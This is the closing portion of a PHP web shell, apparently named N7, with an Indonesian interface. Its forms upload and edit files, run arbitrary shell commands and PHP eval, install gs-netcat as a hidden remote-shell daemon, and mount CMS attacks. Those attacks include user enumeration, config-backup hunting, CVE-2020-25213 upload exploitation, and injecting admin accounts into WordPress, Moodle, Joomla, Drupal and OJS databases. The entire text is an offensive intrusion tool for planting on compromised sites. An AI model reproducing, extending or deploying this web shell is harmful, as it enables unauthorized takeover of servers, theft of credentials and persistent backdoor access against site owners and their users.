                <input type="hidden" name="csrf" value="<?=$csrf?>"><input type="hidden" name="act" value="delete"><input type="hidden" name="file" value="<?=h($p)?>">
                <button class="btn xs red" type="submit">DEL</button>
              </form>
            </td>
          </tr>
        <?php endforeach; ?>
        </tbody>
      </table>
    </div>
    <div class="legend">
      <span><span class="dot dot-safe"></span>755/644 aman</span>
      <span><span class="dot dot-danger"></span>777/666 bahaya</span>
      <span><span class="dot dot-warn"></span>lainnya</span>
      <span><span class="dot dot-locked"></span>000 terkunci</span>
    </div>
  </div>
</div>

<div class="grid">
  <div class="card green"><h2>⬆ UPLOAD</h2><div class="body">
    <form method="post" enctype="multipart/form-data">
      <input type="hidden" name="csrf" value="<?=$csrf?>"><input type="hidden" name="act" value="upload">
      <input type="file" name="upfile" required>
      <div class="row" style="margin-top:8px"><button class="btn green" type="submit">⬆ UPLOAD</button></div>
    </form>
  </div></div>
  <div class="card green"><h2>📁 MKDIR / CREATE</h2><div class="body">
    <form method="post">
      <input type="hidden" name="csrf" value="<?=$csrf?>"><label>DIR NAME</label>
      <div class="row"><input type="text" name="name" placeholder="folder"><button class="btn green" type="submit" name="act" value="mkdir">📁</button></div>
    </form>
    <form method="post" style="margin-top:8px">
      <input type="hidden" name="csrf" value="<?=$csrf?>"><label>FILE NAME</label>
      <input type="text" name="name" placeholder="file.php"><label>CONTENT</label><textarea name="content"></textarea>
      <div class="row" style="margin-top:6px"><button class="btn green" type="submit" name="act" value="create">📄 CREATE</button></div>
    </form>
  </div></div>
  <div class="card cyan"><h2>▶ CMD</h2><div class="body">
    <form method="post">
      <input type="hidden" name="csrf" value="<?=$csrf?>"><input type="hidden" name="act" value="cmd">
      <div class="row"><input type="text" name="cmd" placeholder="id; uname -a"><button class="btn cyan" type="submit">▶ RUN</button></div>
    </form>
  </div></div>
  <div class="card cyan"><h2>▶ PHP EVAL</h2><div class="body">
    <form method="post">
      <input type="hidden" name="csrf" value="<?=$csrf?>"><input type="hidden" name="act" value="php">
      <textarea name="code" placeholder="phpinfo();"></textarea>
      <div class="row" style="margin-top:6px"><button class="btn cyan" type="submit">▶ EXEC</button></div>
    </form>
  </div></div>
</div>

<div id="editModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3>☠ EDIT FILE — <span id="editFileName"></span></h3>
      <button class="modal-close" onclick="closeEditModal()">✕</button>
    </div>
    <div class="modal-body">
      <form method="post" id="editForm">
        <input type="hidden" name="csrf" value="<?=$csrf?>">
        <input type="hidden" name="act" value="save">
        <input type="hidden" name="file" id="editFilePath">
        <textarea name="content" id="editContent" class="edit-textarea" placeholder="File content..."></textarea>
        <div class="row" style="margin-top:10px">
          <button class="btn green" type="submit">💾 SAVE</button>
          <button class="btn" type="button" onclick="closeEditModal()">✕ CANCEL</button>
        </div>
      </form>
    </div>
  </div>
</div>

<?php elseif ($page === 'gsocket'): ?>
<div class="alert info">
  🔌 <b>GSOCKET 1-CLICK AUTO</b> — Session <b>unik per website</b>. Klik <b>⚡ GSOCKET AUTO</b> untuk install + connect.
</div>
<div class="card cyan">
  <h2>🔌 GSOCKET — SESSION: <span style="color:#ff88ff"><?=h($gs_active)?></span></h2>
  <div class="body">
    <div class="srv-bar" style="margin-bottom:12px;grid-template-columns:repeat(auto-fit,minmax(200px,1fr))">
      <div class="srv-cell cyan"><span class="k">SESSION UNIK</span><span class="v" style="color:#ff88ff"><?=h($gs_active)?></span></div>
      <div class="srv-cell"><span class="k">SESSION FILE</span><span class="v" style="font-size:9px"><?=h(basename(n7_gs_session_file()))?></span></div>
      <div class="srv-cell"><span class="k">LISTENER CMD</span><span class="v" style="font-size:9px;font-family:monospace">gs-netcat -s "<?=h($gs_active)?>" -l -i</span></div>
      <div class="srv-cell green"><span class="k">SHELL_EXEC</span><span class="v"><?=h($srv['shell_exec'])?></span></div>
    </div>
    <form method="post" style="margin-bottom:12px">
      <input type="hidden" name="csrf" value="<?=$csrf?>">
      <div class="exp-grid">
        <button class="exp-btn gs" style="grid-column:span 2;padding:20px 12px" type="submit" name="gs_act" value="auto" onclick="beep(1200,0.15)">
          <span class="icon" style="font-size:34px">⚡</span>
          <span style="font-size:14px;font-weight:bold">GSOCKET AUTO</span>
          <small style="opacity:.7">1-CLICK INSTALL + CONNECT</small>
        </button>
        <button class="exp-btn cyan" type="submit" name="gs_act" value="install"><span class="icon">⬇</span><span>INSTALL</span></button>
        <button class="exp-btn" type="submit" name="gs_act" value="run"><span class="icon">▶</span><span>RUN</span></button>
        <button class="exp-btn orange" type="submit" name="gs_act" value="daemon"><span class="icon">👻</span><span>DAEMON</span></button>
        <button class="exp-btn cyan" type="submit" name="gs_act" value="check"><span class="icon">🔍</span><span>CHECK</span></button>
      </div>
    </form>
    <details style="margin-bottom:12px">
      <summary style="cursor:pointer;color:#88ddff;padding:8px;font-size:11px;text-shadow:0 0 3px #000">⚙️ Advanced Settings</summary>
      <div style="padding:8px;background:rgba(0,25,35,.65);border-radius:5px;margin-top:8px">
        <form method="post">
          <input type="hidden" name="csrf" value="<?=$csrf?>">
          <label>Custom Session ID (kosong = pakai auto)</label>
          <div class="row"><input type="text" name="gs_session" value="<?=h($_POST['gs_session'] ?? '')?>" placeholder="<?=h($gs_active)?>"><button class="btn cyan" type="submit" name="gs_act" value="save_session">💾 SAVE</button></div>
          <label>Mode RUN</label>
          <div class="row">
            <select name="gs_mode"><option value="interactive">-i interactive</option><option value="exec">-e /bin/sh</option><option value="listen">-l -i listen</option></select>
            <input type="text" name="gs_timeout" value="30" style="max-width:90px">
          </div>
          <label>Delay (detik)</label>
          <div class="row"><input type="text" name="gs_delay" value="0" style="max-width:90px"></div>
          <div class="row" style="margin-top:8px"><button class="btn orange" type="submit" name="gs_act" value="regen" onclick="return confirm('Regenerate session?')">🔄 REGEN</button></div>
        </form>
      </div>
    </details>
    <?php if ($gs_result !== ''): ?><div class="msg term-cyan" style="margin-top:12px"><?=h($gs_result)?></div><?php endif; ?>
  </div>
</div>

<?php elseif ($page === 'exploit'): ?>
<div class="alert info">🔒 Self-lock: exploit hanya ke <code><?=h($self_base)?></code></div>
<div class="card green">
  <h2>⚔ EXPLOIT + CMS ATTACK</h2>
  <div class="body">
    <form method="post">
      <input type="hidden" name="csrf" value="<?=$csrf?>">
      <label>TARGET URL</label>
      <div class="row"><input type="text" name="target" value="<?=h($_POST['target'] ?? $self_base)?>"></div>
      <label style="margin-top:10px">CMS CREDENTIALS (untuk DB Inject / Reset)</label>
      <div class="row">
        <input type="text" name="cms_user" value="<?=h($_POST['cms_user'] ?? N7_DEFAULT_ADMIN_USER)?>" placeholder="username">
        <input type="text" name="cms_pass" value="<?=h($_POST['cms_pass'] ?? N7_DEFAULT_ADMIN_PASS)?>" placeholder="password">
        <input type="email" name="cms_email" value="<?=h($_POST['cms_email'] ?? N7_DEFAULT_EMAIL)?>" placeholder="email">
      </div>
      <label>ROOT PATH (kosong = auto-detect)</label>
      <div class="row"><input type="text" name="cms_root" value="<?=h($_POST['cms_root'] ?? '')?>" placeholder="/var/www/html"></div>

      <label style="margin-top:10px">EXPLOIT SCAN</label>
      <div class="exp-grid">
        <button class="exp-btn full" type="submit" name="exploit_act" value="full" onclick="beep(1000,0.1)"><span class="icon">⚡</span><span>FULL SCAN<br><small style="opacity:.6">semua cek</small></span></button>
        <button class="exp-btn green" type="submit" name="exploit_act" value="detect_cms"><span class="icon">🎯</span><span>DETECT CMS<br><small style="opacity:.6">WP/Moodle/Joomla</small></span></button>
        <button class="exp-btn green" type="submit" name="exploit_act" value="user_enum"><span class="icon">👤</span><span>USER ENUM<br><small style="opacity:.6">?author=1-10</small></span></button>
        <button class="exp-btn green" type="submit" name="exploit_act" value="rest_users"><span class="icon">🔌</span><span>REST USERS<br><small style="opacity:.6">wp/v2/users</small></span></button>
        <button class="exp-btn green" type="submit" name="exploit_act" value="xmlrpc"><span class="icon">📡</span><span>XML-RPC<br><small style="opacity:.6">listMethods</small></span></button>
        <button class="exp-btn" type="submit" name="exploit_act" value="config_bak"><span class="icon">🔑</span><span>WP-CONFIG BAK<br><small style="opacity:.6">backup files</small></span></button>
        <button class="exp-btn" type="submit" name="exploit_act" value="dir_list"><span class="icon">📂</span><span>DIR LISTING<br><small style="opacity:.6">open dirs</small></span></button>
        <button class="exp-btn" type="submit" name="exploit_act" value="git"><span class="icon">🔓</span><span>.GIT EXPOSED<br><small style="opacity:.6">source leak</small></span></button>
        <button class="exp-btn" type="submit" name="exploit_act" value="version"><span class="icon">🏷</span><span>WP VERSION<br><small style="opacity:.6">readme+feed</small></span></button>
        <button class="exp-btn" type="submit" name="exploit_act" value="mstore"><span class="icon">🛒</span><span>MSTORE CHECK<br><small style="opacity:.6">plugin</small></span></button>
        <button class="exp-btn cyan" type="submit" name="exploit_act" value="plugins"><span class="icon">🧩</span><span>PLUGINS<br><small style="opacity:.6">17 plugins</small></span></button>
        <button class="exp-btn cyan" type="submit" name="exploit_act" value="robots"><span class="icon">🤖</span><span>ROBOTS/SITEMAP<br><small style="opacity:.6">discovery</small></span></button>
        <button class="exp-btn orange" type="submit" name="exploit_act" value="upload_vuln"><span class="icon">💣</span><span>UPLOAD VULN<br><small style="opacity:.6">CVE-2020-25213</small></span></button>
      </div>

      <label style="margin-top:14px">CMS DB-INJECT / RESET</label>
      <div class="exp-grid">
        <button class="exp-btn orange" type="submit" name="cms_act" value="auto_all"><span class="icon">⚡</span><span>AUTO ALL CMS<br><small style="opacity:.6">semua config</small></span></button>
        <button class="exp-btn orange" type="submit" name="cms_act" value="detect_configs"><span class="icon">🔍</span><span>SCAN CONFIGS<br><small style="opacity:.6">list config</small></span></button>
        <button class="exp-btn green" type="submit" name="cms_act" value="wp_db_admin"><span class="icon">🌐</span><span>WP DB-INJECT<br><small style="opacity:.6">insert wp_users</small></span></button>
        <button class="exp-btn green" type="submit" name="cms_act" value="moodle_db_admin"><span class="icon">🎓</span><span>MOODLE DB<br><small style="opacity:.6">insert mdl_user</small></span></button>
        <button class="exp-btn green" type="submit" name="cms_act" value="joomla_db_admin"><span class="icon">🌏</span><span>JOOMLA DB<br><small style="opacity:.6">insert jos_users</small></span></button>
        <button class="exp-btn green" type="submit" name="cms_act" value="drupal_db_admin"><span class="icon">💧</span><span>DRUPAL DB<br><small style="opacity:.6">insert users</small></span></button>
        <button class="exp-btn green" type="submit" name="cms_act" value="ojs_db_admin"><span class="icon">📚</span><span>OJS DB<br><small style="opacity:.6">insert users</small></span></button>
        <button class="exp-btn" type="submit" name="cms_act" value="wp_reset"><span class="icon">🔐</span><span>WP RESET PASS<br><small style="opacity:.6">lostpassword</small></span></button>
        <button class="exp-btn" type="submit" name="cms_act" value="mass_reset"><span class="icon">🔄</span><span>MASS RESET<br><small style="opacity:.6">all WP users</small></span></button>
        <button class="exp-btn cyan" type="submit" name="cms_act" value="detect"><span class="icon">🎯</span><span>DETECT CMS<br><small style="opacity:.6">identify type</small></span></button>
      </div>
    </form>
    <?php if ($exploit_result !== ''): ?><div class="msg term" style="margin-top:12px"><?=h($exploit_result)?></div><?php endif; ?>
    <?php if ($cms_result !== ''): ?><div class="msg term-orange" style="margin-top:12px"><?=h($cms_result)?></div><?php endif; ?>
  </div>
</div>

<?php elseif ($page === 'tools'): ?>
<div class="card cyan">
  <h2>⚙ TOOLS</h2>
  <div class="body">
    <form method="post">
      <input type="hidden" name="csrf" value="<?=$csrf?>">
      <div class="exp-grid">
        <button class="exp-btn cyan" type="submit" name="tools_act" value="sysinfo"><span class="icon">🖥</span><span>SYS INFO</span></button>
        <button class="exp-btn cyan" type="submit" name="tools_act" value="df"><span class="icon">🔍</span><span>DISABLE_FN</span></button>
        <button class="exp-btn" type="submit" name="tools_act" value="phpinfo"><span class="icon">📋</span><span>PHPINFO</span></button>
        <button class="exp-btn" type="submit" name="tools_act" value="phpinfo_html"><span class="icon">🎨</span><span>PHPINFO HTML</span></button>
        <button class="exp-btn cyan" type="submit" name="tools_act" value="env"><span class="icon">🌍</span><span>ENV</span></button>
        <button class="exp-btn cyan" type="submit" name="tools_act" value="dns"><span class="icon">🌐</span><span>DNS LOOKUP</span></button>
      </div>
    </form>
    <form method="post" style="margin-top:12px">
      <input type="hidden" name="csrf" value="<?=$csrf?>">
      <label>FIND CONFIG FILES</label>
      <div class="row"><input type="text" name="root" value="/var/www"><button class="btn cyan" type="submit" name="tools_act" value="find_wp">🔎 SCAN</button></div>
    </form>
    <?php if ($tools_result !== ''): ?>
      <?php if (strpos($tools_result, '<div') === 0): ?><div style="margin-top:12px"><?=$tools_result?></div>
      <?php else: ?><div class="msg term-cyan" style="margin-top:12px"><?=h($tools_result)?></div><?php endif; ?>
    <?php endif; ?>
  </div>
</div>
<?php endif; ?>

</div>

<footer>
  <span>☠ <?=N7_NAME?> v<?=N7_VERSION?> // BY <?=N7_AUTHOR?> // <?=N7_CONTACT?></span>
  <span>PHP <?=PHP_VERSION?> // <?=h(php_uname('s'))?></span>
</footer>

<script>
var ac = null;
function getAC(){ if(!ac){ try{ ac = new (window.AudioContext||window.webkitAudioContext)(); }catch(e){} } return ac; }
function beep(f, d, type){ var c = getAC(); if(!c) return; var o = c.createOscillator(), g = c.createGain();
  o.type = type || 'square'; o.frequency.value = f || 700; g.gain.setValueAtTime(0.05, c.currentTime);
  g.gain.exponentialRampToValueAtTime(0.001, c.currentTime+(d||0.08));
  o.connect(g); g.connect(c.destination); o.start(); o.stop(c.currentTime+(d||0.08)); }
function accessGranted(){
  beep(500, 0.1); setTimeout(function(){ beep(700, 0.1); }, 100);
  setTimeout(function(){ beep(900, 0.1); }, 200);
  setTimeout(function(){ beep(1200, 0.2); }, 300);
}
function delSound(){ beep(300,0.12); setTimeout(function(){beep(200,0.15);},100); }
function navSound(){ beep(900,0.06); setTimeout(function(){beep(1100,0.05);},60); }
function confirmDel(n){ if(confirm('☠ Hapus "'+n+'"?\nTidak bisa dibatalkan!')){ delSound(); return true; } return false; }
try { if (localStorage.getItem('n7_login_success') === '1') { localStorage.removeItem('n7_login_success'); accessGranted(); } } catch(e) {}
function goPath(){ var p = document.getElementById('gotoPath'); if(!p) return; var v = p.value.trim();
  if(v){ navSound(); window.location.href='?d='+encodeURIComponent(v); } }
var gp = document.getElementById('gotoPath'); if(gp){ gp.addEventListener('keypress', function(e){ if(e.key==='Enter'){ e.preventDefault(); goPath(); }}); }

function openEditModal(path, name){
  beep(800, 0.05);
  document.getElementById('editFilePath').value = path;
  document.getElementById('editFileName').textContent = name;
  document.getElementById('editContent').value = 'Loading...';
  document.getElementById('editModal').classList.add('active');
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '?action=readfile&f=' + encodeURIComponent(path), true);
  xhr.onload = function(){
    try { var resp = JSON.parse(xhr.responseText);
      if (resp.ok) document.getElementById('editContent').value = resp.content || '';
      else document.getElementById('editContent').value = '// ERROR: ' + (resp.error || 'unknown');
    } catch(e) { document.getElementById('editContent').value = '// ERROR: ' + xhr.responseText.substring(0, 500); }
  };
  xhr.onerror = function(){ document.getElementById('editContent').value = '// ERROR: request failed'; };
  xhr.send();
}
function closeEditModal(){ document.getElementById('editModal').classList.remove('active'); }
document.getElementById('editModal').addEventListener('click', function(e){ if (e.target === this) closeEditModal(); });
document.addEventListener('keydown', function(e){ if (e.key === 'Escape') closeEditModal(); });

function chmodP(path, current){
  var modal = document.createElement('div');
  modal.className = 'modal active';
  modal.innerHTML = '<div class="modal-content" style="max-width:400px">' +
    '<div class="modal-header"><h3>CHMOD</h3><button class="modal-close" onclick="this.closest(\'.modal\').remove()">✕</button></div>' +
    '<div class="modal-body">' +
    '<p style="color:#aaffcc;font-size:11px;margin-bottom:8px;word-break:break-all">' + path + '</p>' +
    '<label>Current: ' + (current||'?') + '</label>' +
    '<input type="text" id="chmodInput" value="' + (current||'0644') + '" pattern="[0-7]{3,4}" placeholder="0644" style="font-size:16px;text-align:center;letter-spacing:4px">' +
    '<div class="row" style="margin-top:12px">' +
    '<button class="btn green" onclick="submitChmod(\'' + path.replace(/'/g, "\\'") + '\', this)">✓ OK</button>' +
    '<button class="btn" onclick="this.closest(\'.modal\').remove()">✕ CANCEL</button>' +
    '</div></div></div>';
  document.body.appendChild(modal);
  setTimeout(function(){ var i = document.getElementById('chmodInput'); if(i){ i.focus(); i.select(); } }, 100);
  modal.addEventListener('click', function(e){ if (e.target === modal) modal.remove(); });
  document.getElementById('chmodInput').addEventListener('keypress', function(e){
    if (e.key === 'Enter') { e.preventDefault(); submitChmod(path); }
  });
}
function submitChmod(path){
  var m = document.getElementById('chmodInput').value;
  if (!/^[0-7]{3,4}$/.test(m)) { alert('Mode must be 0644 / 0755 / 0777'); return; }
  beep(800, 0.05);
  var frm = document.createElement('form'); frm.method = 'post';
  frm.innerHTML = '<input type="hidden" name="csrf" value="<?=$csrf?>"><input type="hidden" name="act" value="chmod"><input type="hidden" name="file" value="' + path.replace(/"/g, '&quot;') + '"><input type="hidden" name="mode" value="' + m + '">';
  document.body.appendChild(frm); frm.submit();
}

function renameP(path){
  var modal = document.createElement('div');
  modal.className = 'modal active';
  modal.innerHTML = '<div class="modal-content" style="max-width:500px">' +
    '<div class="modal-header"><h3>RENAME</h3><button class="modal-close" onclick="this.closest(\'.modal\').remove()">✕</button></div>' +
    '<div class="modal-body">' +
    '<p style="color:#aaffcc;font-size:11px;margin-bottom:8px;word-break:break-all">' + path + '</p>' +
    '<label>New full path</label>' +
    '<input type="text" id="renameInput" value="' + path.replace(/"/g, '&quot;') + '">' +
    '<div class="row" style="margin-top:12px">' +
    '<button class="btn green" onclick="submitRename(\'' + path.replace(/'/g, "\\'") + '\')">✓ OK</button>' +
    '<button class="btn" onclick="this.closest(\'.modal\').remove()">✕ CANCEL</button>' +
    '</div></div></div>';
  document.body.appendChild(modal);
  setTimeout(function(){ var i = document.getElementById('renameInput'); if(i){ i.focus(); var v = i.value.lastIndexOf('/'); i.setSelectionRange(v+1, i.value.length); } }, 100);
  modal.addEventListener('click', function(e){ if (e.target === modal) modal.remove(); });
  document.getElementById('renameInput').addEventListener('keypress', function(e){
    if (e.key === 'Enter') { e.preventDefault(); submitRename(path); }
  });
}
function submitRename(oldPath){
  var n = document.getElementById('renameInput').value.trim();
  if (!n || n === oldPath) return;
  beep(900, 0.05);
  var frm = document.createElement('form'); frm.method = 'post';
  frm.innerHTML = '<input type="hidden" name="csrf" value="<?=$csrf?>"><input type="hidden" name="act" value="rename"><input type="hidden" name="old" value="' + oldPath.replace(/"/g, '&quot;') + '"><input type="hidden" name="new" value="' + n.replace(/"/g, '&quot;') + '">';
  document.body.appendChild(frm); frm.submit();
}

<?php if ($action_done === 'del'): ?>delSound();<?php endif; ?>
<?php if (in_array($action_done, ['chmod','rename','mkdir','create','upload','save'])): ?>navSound();<?php endif; ?>
</script>
</body></html>
